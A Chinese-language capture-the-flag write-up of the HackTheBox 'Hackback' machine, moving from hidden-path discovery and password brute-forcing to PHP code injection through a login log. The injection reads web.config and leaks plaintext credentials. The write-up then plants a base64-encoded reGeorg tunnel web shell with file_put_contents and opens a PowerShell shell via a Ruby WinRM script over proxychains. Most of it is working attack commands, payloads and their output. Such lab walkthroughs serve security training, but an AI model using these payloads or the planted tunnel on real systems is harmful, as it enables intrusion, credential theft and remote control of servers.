<p>注意大小写问题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nodejs</span><br><span class="line">&gt;代码-----代码</span><br><span class="line">&gt; x</span><br><span class="line">&apos;Secure Login Bypass&apos;</span><br><span class="line">&gt; z</span><br><span class="line">&apos;Remember the secret path is&apos;</span><br><span class="line">&gt; h</span><br><span class="line">&apos;2bb6916122f1da34dcd916421e531578&apos;</span><br><span class="line">&gt; y</span><br><span class="line">&apos;Just in case I loose access to the admin panel&apos;</span><br><span class="line">&gt; t</span><br><span class="line">&apos;?action=(show,list,exec,init)&apos;</span><br><span class="line">&gt; s</span><br><span class="line">&apos;&amp;site=(twitter,paypal,facebook,hackthebox)&apos;</span><br><span class="line">&gt; i</span><br><span class="line">&apos;&amp;password=********&apos;</span><br><span class="line">&gt; k</span><br><span class="line">&apos;&amp;session=&apos;</span><br><span class="line">&gt; w</span><br><span class="line">&apos;Nothing more to say&apos;</span><br></pre></td></tr></table></figure></p>
<p>隐藏目录<code>/2bb6916122f1da34dcd916421e531578</code>,但是被重定向了，但是这证明目录确实存在，查找目录下网页<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# wfuzz -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt --hc 404 -t 20</span><br><span class="line">http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/FUZZ</span><br><span class="line">002180:  C=403     57 L      191 W         2452 Ch        &quot;/Trace.axd&quot;</span><br><span class="line">002288:  C=302      0 L        0 W            0 Ch        &quot;/webadmin.php&quot;</span><br><span class="line">000004:  C=400     80 L      276 W         3420 Ch        &quot;/%3f/&quot;</span><br></pre></td></tr></table></figure></p>
<p>再来看js<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var t = &apos;?action=(show,list,exec,init)&apos;;</span><br><span class="line">var s = &apos;&amp;site=(twitter,paypal,facebook,hackthebox)&apos;;</span><br><span class="line">var i = &apos;&amp;password=********&apos;;</span><br><span class="line">var k = &apos;&amp;session=&apos;;</span><br><span class="line">var w = &apos;Nothing more to say&apos;;</span><br></pre></td></tr></table></figure></p>
<p>将actions，sites模糊处理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# cat actions.txt</span><br><span class="line">show</span><br><span class="line">list</span><br><span class="line">exec</span><br><span class="line">init</span><br><span class="line">root@kali:~# cat sites.txt</span><br><span class="line">twitter</span><br><span class="line">paypal</span><br><span class="line">facebook</span><br><span class="line">hackthebox</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# wfuzz -w actions.txt -w sites.txt --hc 404 &quot;http://admin.hackback.htb/2b b6916122f1da34dcd916421e531578/webadmin.php?action=FUZZ&amp;site=FUZ2Z&amp;password =test&amp;session=test&quot;</span><br></pre></td></tr></table></figure>
<p>得到最终结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# curl &apos;http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&amp;site=hackthebox&amp;password=test&amp;session=test&apos;</span><br><span class="line">Wrong secret key!</span><br></pre></td></tr></table></figure></p>
<p>出现预期信息<br>测试passwd参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# wfuzz -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt &quot;http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/WebAdmin.php?action=list&amp;site=hackthebox&amp;password=FUZZ&quot;</span><br><span class="line">000008:  C=302      8 L       18 W          277 Ch        &quot;12345678&quot;</span><br></pre></td></tr></table></figure></p>
<p>最后测试session时，发现cookie不变<br><img src="https://i.loli.net/2019/07/14/5d2b0fa4a446e54147.png" alt="8.png"><br>是自己IP的SHA256哈希（我使用了两个账号，所以cookie不同）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# curl -i &apos;http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&amp;site=hackthebox&amp;password=12345678&amp;session=bfe823095bbcc831eb7220eeb728811d7ce87e 9c1bc2b6818de43e48bcdf417a&apos;</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; .</span><br><span class="line">    [1] =&gt; ..</span><br><span class="line">    [2] =&gt; 0e09c819d319792545579ece736c425ed6b4a480c2f65ac6a46a5412a5aeacf5.log</span><br><span class="line">    [3] =&gt; 921c72c327ac75cd587246a9c67d06ec3f02790e59398300ef6dad16dc764170.log</span><br><span class="line">    [4] =&gt; e691d0d9c19785cf4c5ab50375c10d83130f175f7f89ebd1899eee6a7aab0dd7.log</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p>
<p>每次尝试登录<a href="http://www.hackthebox.htb就会被记录" target="_blank" rel="noopener">www.hackthebox.htb就会被记录</a></p>
<h2 id="PHP代码注入"><a href="#PHP代码注入" class="headerlink" title="PHP代码注入"></a>PHP代码注入</h2><p>使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php print_r(scandir(&apos;.&apos;)); ?&gt; #列出当前目录中的文件</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# curl -i &apos;http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&amp;site=hackthebox&amp;password=12345678&amp;session=bfe823095bbcc831eb7220eeb728811d7ce87e 9c1bc2b6818de43e48bcdf417a&apos;</span><br><span class="line">[14 July 2019, 03:11:17 PM] 10.10.12.91 - Username: Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; .</span><br><span class="line">    [1] =&gt; ..</span><br><span class="line">    [2] =&gt; index.html</span><br><span class="line">    [3] =&gt; rop.aspx</span><br><span class="line">    [4] =&gt; tunnel.aspx</span><br><span class="line">    [5] =&gt; webadmin.php</span><br><span class="line">)</span><br><span class="line">, Password: 12345678</span><br></pre></td></tr></table></figure>
<p>ok,能够返回上一级目录<br><img src="https://i.loli.net/2019/07/14/5d2b49547b14b51058.png" alt="9.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# curl -i &apos;http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&amp;site=hackthebox&amp;password=12345678&amp;session=bfe823095bbcc831eb7220eeb728811d7ce87e 9c1bc2b6818de43e48bcdf417a&apos;</span><br><span class="line">[14 July 2019, 03:19:19 PM] 10.10.12.91 - Username: Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; .</span><br><span class="line">    [1] =&gt; ..</span><br><span class="line">    [2] =&gt; 2bb6916122f1da34dcd916421e531578</span><br><span class="line">    [3] =&gt; App_Data</span><br><span class="line">    [4] =&gt; aspnet_client</span><br><span class="line">    [5] =&gt; css</span><br><span class="line">    [6] =&gt; img</span><br><span class="line">    [7] =&gt; index.php</span><br><span class="line">    [8] =&gt; js</span><br><span class="line">    [9] =&gt; logs</span><br><span class="line">    [10] =&gt; web.config</span><br><span class="line">    [11] =&gt; web.config.old</span><br><span class="line">)</span><br><span class="line">, Password: 12345678</span><br></pre></td></tr></table></figure></p>
<p>似乎出现了配置文件，查看<code>web.config</code>和<code>web.config.old</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo file_get_contents(&apos;../web.config.old&apos;); ?&gt;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2019/07/14/5d2b4cf576f0843908.png" alt="10.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# curl -i &apos;http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&amp;site=hackthebox&amp;password=12345678&amp;session=bfe823095bbcc831eb7220eeb728811d7ce87e 9c1bc2b6818de43e48bcdf417a&apos;</span><br><span class="line">[14 July 2019, 04:35:45 PM] 10.10.12.91 - Username: &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">    &lt;system.webServer&gt;</span><br><span class="line">        &lt;authentication mode=&quot;Windows&quot;&gt;</span><br><span class="line">        &lt;identity impersonate=&quot;true&quot;</span><br><span class="line">            userName=&quot;simple&quot;</span><br><span class="line">            password=&quot;ZonoProprioZomaro:-(&quot;/&gt;</span><br><span class="line">     &lt;/authentication&gt;</span><br><span class="line">        &lt;directoryBrowse enabled=&quot;false&quot; showFlags=&quot;None&quot; /&gt;</span><br><span class="line">    &lt;/system.webServer&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br><span class="line">, Password: 12345678   #web.config</span><br><span class="line">--------------------------------------------------</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">    &lt;system.webServer&gt;</span><br><span class="line">        &lt;authentication mode=&quot;Windows&quot;&gt;</span><br><span class="line">        &lt;identity impersonate=&quot;true&quot;</span><br><span class="line">            userName=&quot;simple&quot;</span><br><span class="line">            password=&quot;ZonoProprioZomaro:-(&quot;/&gt;</span><br><span class="line">     &lt;/authentication&gt;</span><br><span class="line">        &lt;directoryBrowse enabled=&quot;false&quot; showFlags=&quot;None&quot; /&gt;</span><br><span class="line">    &lt;/system.webServer&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br><span class="line">, Password: 12345678</span><br><span class="line">[14 July 2019, 04:42:09 PM] 10.10.12.91 - Username: &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">    &lt;system.webServer&gt;</span><br><span class="line">        &lt;directoryBrowse enabled=&quot;false&quot; showFlags=&quot;None&quot; /&gt;</span><br><span class="line">    &lt;/system.webServer&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br><span class="line">, Password: 12345678  #web.config.old</span><br></pre></td></tr></table></figure></p>
<p>那么就得到<code>simple:ZonoProprioZomaro:-(</code></p>
<h2 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h2><p>线索又消失了，回到开头，查看端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.128:6666/netstat</span><br></pre></td></tr></table></figure></p>
<p>发现winrm，但是需要一个内部代理使我能够连接到winrm，这里将使用<a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">reGeorg</a>,将tunnel.aspx，转换为base64<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php file_put_contents(&quot;tunnel.aspx&quot;,base64_decode(&quot;PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiBFbmFibGVTZXNzaW9uU3RhdGU9IlRydWUiJT4KPCVAIEltcG9ydCBOYW1lc3BhY2U9IlN5c3RlbS5OZXQiICU+CjwlQCBJbXBvcnQgTmFtZXNwYWNlPSJTeXN0ZW0uTmV0LlNvY2tldHMiICU+CjwlCi8qICAgICAgICAgICAgICAgICAgIF9fX19fICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgX19fX18gICBfX19fX18gIF9ffF9fXyAgfF9fICBfX19fX18gIF9fX19fICBfX19fXyAgIF9fX19fXyAgCiB8ICAgICB8IHwgICBfX198fCAgIF9fX3wgICAgfHwgICBfX198LyAgICAgXHwgICAgIHwgfCAgIF9fX3wgCiB8ICAgICBcIHwgICBfX198fCAgIHwgIHwgICAgfHwgICBfX198fCAgICAgfHwgICAgIFwgfCAgIHwgIHwgCiB8X198XF9fXHxfX19fX198fF9fX19fX3wgIF9ffHxfX19fX198XF9fX19fL3xfX3xcX19cfF9fX19fX3wgCiAgICAgICAgICAgICAgICAgICAgfF9fX19ffAogICAgICAgICAgICAgICAgICAgIC4uLiBldmVyeSBvZmZpY2UgbmVlZHMgYSB0b29sIGxpa2UgR2VvcmcKICAgICAgICAgICAgICAgICAgICAKICB3aWxsZW1Ac2Vuc2Vwb3N0LmNvbSAvIEBfd19tX18KICBzYW1Ac2Vuc2Vwb3N0LmNvbSAvIEB0cm93YWx0cwogIGV0aWVubmVAc2Vuc2Vwb3N0LmNvbSAvIEBrYW1wX3N0YWFsZHJhYWQKCkxlZ2FsIERpc2NsYWltZXIKVXNhZ2Ugb2YgcmVHZW9yZyBmb3IgYXR0YWNraW5nIG5ldHdvcmtzIHdpdGhvdXQgY29uc2VudApjYW4gYmUgY29uc2lkZXJlZCBhcyBpbGxlZ2FsIGFjdGl2aXR5LiBUaGUgYXV0aG9ycyBvZgpyZUdlb3JnIGFzc3VtZSBubyBsaWFiaWxpdHkgb3IgcmVzcG9uc2liaWxpdHkgZm9yIGFueQptaXN1c2Ugb3IgZGFtYWdlIGNhdXNlZCBieSB0aGlzIHByb2dyYW0uCgpJZiB5b3UgZmluZCByZUdlb3JnZSBvbiBvbmUgb2YgeW91ciBzZXJ2ZXJzIHlvdSBzaG91bGQKY29uc2lkZXIgdGhlIHNlcnZlciBjb21wcm9taXNlZCBhbmQgbGlrZWx5IGZ1cnRoZXIgY29tcHJvbWlzZQp0byBleGlzdCB3aXRoaW4geW91ciBpbnRlcm5hbCBuZXR3b3JrLgoKRm9yIG1vcmUgaW5mb3JtYXRpb24sIHNlZToKaHR0cHM6Ly9naXRodWIuY29tL3NlbnNlcG9zdC9yZUdlb3JnCiovCiAgICB0cnkKICAgIHsKICAgICAgICBpZiAoUmVxdWVzdC5IdHRwTWV0aG9kID09ICJQT1NUIikKICAgICAgICB7CiAgICAgICAgICAgIC8vU3RyaW5nIGNtZCA9IFJlcXVlc3QuSGVhZGVycy5HZXQoIlgtQ01EIik7CiAgICAgICAgICAgIFN0cmluZyBjbWQgPSBSZXF1ZXN0LlF1ZXJ5U3RyaW5nLkdldCgiY21kIikuVG9VcHBlcigpOwogICAgICAgICAgICBpZiAoY21kID09ICJDT05ORUNUIikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgU3RyaW5nIHRhcmdldCA9IFJlcXVlc3QuUXVlcnlTdHJpbmcuR2V0KCJ0YXJnZXQiKS5Ub1VwcGVyKCk7CiAgICAgICAgICAgICAgICAgICAgLy9SZXF1ZXN0LkhlYWRlcnMuR2V0KCJYLVRBUkdFVCIpOwogICAgICAgICAgICAgICAgICAgIGludCBwb3J0ID0gaW50LlBhcnNlKFJlcXVlc3QuUXVlcnlTdHJpbmcuR2V0KCJwb3J0IikpOwogICAgICAgICAgICAgICAgICAgIC8vUmVxdWVzdC5IZWFkZXJzLkdldCgiWC1QT1JUIikpOwogICAgICAgICAgICAgICAgICAgIElQQWRkcmVzcyBpcCA9IElQQWRkcmVzcy5QYXJzZSh0YXJnZXQpOwogICAgICAgICAgICAgICAgICAgIFN5c3RlbS5OZXQuSVBFbmRQb2ludCByZW1vdGVFUCA9IG5ldyBJUEVuZFBvaW50KGlwLCBwb3J0KTsKICAgICAgICAgICAgICAgICAgICBTb2NrZXQgc2VuZGVyID0gbmV3IFNvY2tldChBZGRyZXNzRmFtaWx5LkludGVyTmV0d29yaywgU29ja2V0VHlwZS5TdHJlYW0sIFByb3RvY29sVHlwZS5UY3ApOwogICAgICAgICAgICAgICAgICAgIHNlbmRlci5Db25uZWN0KHJlbW90ZUVQKTsKICAgICAgICAgICAgICAgICAgICBzZW5kZXIuQmxvY2tpbmcgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICBTZXNzaW9uLkFkZCgic29ja2V0Iiwgc2VuZGVyKTsKICAgICAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGV4KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1FUlJPUiIsIGV4Lk1lc3NhZ2UpOwogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgaWYgKGNtZCA9PSAiRElTQ09OTkVDVCIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgU29ja2V0IHMgPSAoU29ja2V0KVNlc3Npb25bInNvY2tldCJdOwogICAgICAgICAgICAgICAgICAgIHMuQ2xvc2UoKTsKICAgICAgICAgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBleCl7CgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgU2Vzc2lvbi5BYmFuZG9uKCk7CiAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSBpZiAoY21kID09ICJGT1JXQVJEIikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgU29ja2V0IHMgPSAoU29ja2V0KVNlc3Npb25bInNvY2tldCJdOwogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgaW50IGJ1ZmZMZW4gPSBSZXF1ZXN0LkNvbnRlbnRMZW5ndGg7CiAgICAgICAgICAgICAgICAgICAgYnl0ZVtdIGJ1ZmYgPSBuZXcgYnl0ZVtidWZmTGVuXTsKICAgICAgICAgICAgICAgICAgICBpbnQgYyA9IDA7CiAgICAgICAgICAgICAgICAgICAgd2hpbGUgKChjID0gUmVxdWVzdC5JbnB1dFN0cmVhbS5SZWFkKGJ1ZmYsIDAsIGJ1ZmYuTGVuZ3RoKSkgPiAwKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgcy5TZW5kKGJ1ZmYpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGV4KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1FUlJPUiIsIGV4Lk1lc3NhZ2UpOwogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgaWYgKGNtZCA9PSAiUkVBRCIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFNvY2tldCBzID0gKFNvY2tldClTZXNzaW9uWyJzb2NrZXQiXTsKICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGludCBjID0gMDsKICAgICAgICAgICAgICAgICAgICBieXRlW10gcmVhZEJ1ZmYgPSBuZXcgYnl0ZVs1MTJdOwogICAgICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgKChjID0gcy5SZWNlaXZlKHJlYWRCdWZmKSkgPiAwKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBieXRlW10gbmV3QnVmZiA9IG5ldyBieXRlW2NdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgLy9BcnJheS5Db25zdHJhaW5lZENvcHkocmVhZEJ1ZmYsIDAsIG5ld0J1ZmYsIDAsIGMpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgU3lzdGVtLkJ1ZmZlci5CbG9ja0NvcHkocmVhZEJ1ZmYsIDAsIG5ld0J1ZmYsIDAsIGMpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQmluYXJ5V3JpdGUobmV3QnVmZik7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLVNUQVRVUyIsICJPSyIpOwogICAgICAgICAgICAgICAgICAgIH0gICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGNhdGNoIChTb2NrZXRFeGNlcHRpb24gc29leCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiT0siKTsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIChFeGNlcHRpb24gZXgpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLUVSUk9SIiwgZXguTWVzc2FnZSk7CiAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLVNUQVRVUyIsICJGQUlMIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gCiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgUmVzcG9uc2UuV3JpdGUoIkdlb3JnIHNheXMsICdBbGwgc2VlbXMgZmluZSciKTsKICAgICAgICB9CiAgICB9CiAgICBjYXRjaCAoRXhjZXB0aW9uIGV4S2FrKQogICAgewogICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1FUlJPUiIsIGV4S2FrLk1lc3NhZ2UpOwogICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgfQolPgoK&quot;)); ?&gt;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2019/07/15/5d2b56b784c7f57856.png" alt="11.png"><br>编辑<code>/etc/proxychains.conf</code>的<code>socks4  127.0.0.1 6666</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">root@kali:~/Desktop/reGeorg# python reGeorgSocksProxy.py -p 6666 -u http://admin.hackback.htb /2bb6916122f1da34dcd916421e531578/tunnel.aspx</span><br><span class="line">[INFO   ]  Log Level set to [INFO]</span><br><span class="line">[INFO   ]  Starting socks server [127.0.0.1:6666], tunnel at [http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/tunnel.aspx]</span><br><span class="line">[INFO   ]  Checking if Georg is ready</span><br><span class="line">[INFO   ]  Georg says, &apos;All seems fine&apos;</span><br></pre></td></tr></table></figure></p>
<p>这里使用<a href="https://github.com/Alamot/code-snippets/tree/master/winrm" target="_blank" rel="noopener">winrm</a>,值得注意的是ruby接口和库问题。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/ruby</span><br><span class="line">require &apos;winrm&apos;</span><br><span class="line"></span><br><span class="line"># Author: Alamot</span><br><span class="line"></span><br><span class="line">conn = WinRM::Connection.new( </span><br><span class="line">  endpoint: &apos;http://10.10.10.128:5985/wsman&apos;,</span><br><span class="line">  transport: :ssl,</span><br><span class="line">  user: &apos;simple&apos;,</span><br><span class="line">  password: &apos;ZonoProprioZomaro:-(&apos;,</span><br><span class="line">  :no_ssl_peer_verification =&gt; true</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">command=&quot;&quot;</span><br><span class="line"></span><br><span class="line">conn.shell(:powershell) do |shell|</span><br><span class="line">    until command == &quot;exit\n&quot; do</span><br><span class="line">        output = shell.run(&quot;-join($id,&apos;PS &apos;,$(whoami),&apos;@&apos;,$env:computername,&apos; &apos;,$((gi $pwd).Name),&apos;&gt; &apos;)&quot;)</span><br><span class="line">        print(output.output.chomp)</span><br><span class="line">        command = STDIN.gets        </span><br><span class="line">        output = shell.run(command) do |stdout, stderr|</span><br><span class="line">            STDOUT.print stdout</span><br><span class="line">            STDERR.print stderr</span><br><span class="line">        end</span><br><span class="line">    end    </span><br><span class="line">    puts &quot;Exiting with code #&#123;output.exitcode&#125;&quot;</span><br><span class="line">end</span><br></pre></td></tr></table></figure></p>
<p>等等登，ip变了(•́へ•́╬)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# sudo proxychains ruby winrm.rb</span><br><span class="line">ProxyChains-3.1 (http://proxychains.sf.net)</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:6666-&lt;&gt;&lt;&gt;-10.10.10.128:5985-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">PS hackback\simple@HACKBACK Documents&gt; whoami</span><br><span class="line">hackback\simple</span><br></pre></td></tr></table></figure></p>
<p>接着在<code>Desktop</code>发现信息。哦，但是这个用户下没有flag，代表游戏还得接着玩。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS hackback\simple@HACKBACK Desktop&gt; ls</span><br><span class="line">-a----       11/30/2018   6:09 PM           1274 cmd.lnk</span><br></pre></td></tr></table></figure></p>
<p>在C:\ 下发现特殊的util目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS hackback\simple@HACKBACK util&gt; dir -force</span><br><span class="line">d--h--       12/21/2018   6:21 AM                scripts</span><br></pre></td></tr></table></figure></p>
